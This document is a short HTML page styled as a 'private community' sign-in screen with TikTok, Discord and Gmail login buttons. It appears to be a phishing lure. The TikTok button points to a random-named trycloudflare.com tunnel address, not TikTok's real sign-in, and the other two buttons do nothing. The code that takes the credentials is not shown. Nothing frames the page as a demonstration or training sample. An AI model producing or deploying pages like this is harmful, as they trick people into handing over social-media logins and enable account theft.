<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Private Community Login</title>

<style>
*{
    box-sizing:border-box;
    font-family:Arial, sans-serif;
}

body{
    margin:0;
    height:100vh;
    display:flex;
    justify-content:center;
    align-items:center;
    background:linear-gradient(135deg,#111827,#374151);
}

.login-box{
    width:380px;
    background:white;
    padding:35px;
    border-radius:15px;
    text-align:center;
    box-shadow:0 10px 30px rgba(0,0,0,.3);
}

h2{
    margin-bottom:10px;
}

p{
    color:#666;
    margin-bottom:25px;
}

.btn{
    width:100%;
    padding:14px;
    margin:12px 0;
    border:none;
    border-radius:8px;
    cursor:pointer;
    font-size:16px;
    font-weight:bold;
    display:flex;
    justify-content:center;
    align-items:center;
    gap:10px;
    text-decoration:none;
}

.tiktok{
    background:#000;
    color:white;
}

.discord{
    background:#5865F2;
    color:white;
}

.google{
    background:white;
    border:1px solid #ddd;
    color:#333;
}

.icon{
    font-size:22px;
}

.btn:hover{
    opacity:.85;
}

.footer{
    margin-top:20px;
    font-size:13px;
    color:#888;
}
</style>

</head>

<body>

<div class="login-box">

<h2>Join our private community</h2>

<p>Login using your social account</p>

<a href="https://flour-subsidiaries-responsibilities-maiden.trycloudflare.com" class="btn tiktok">
<span class="icon">♪</span>
Login with TikTok
</a>

<button class="btn discord">
<span class="icon">🔒</span>
Login with Discord
</button>

<button class="btn google">
<span class="icon">🔒</span>
Login with Gmail
</button>

<div class="footer">
By continuing, you agree to our terms.
</div>

</div>

</body>
</html>
